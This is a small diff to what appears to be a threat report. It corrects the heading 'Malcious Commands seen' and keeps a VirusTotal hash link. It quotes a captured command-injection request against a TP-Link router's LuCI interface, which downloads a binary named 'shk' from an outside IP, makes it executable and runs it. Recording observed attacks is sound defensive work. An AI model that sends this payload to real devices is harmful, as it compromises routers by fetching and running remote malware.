@@ -18,7 +18,7 @@ d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 http://HOSTNAME/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
 
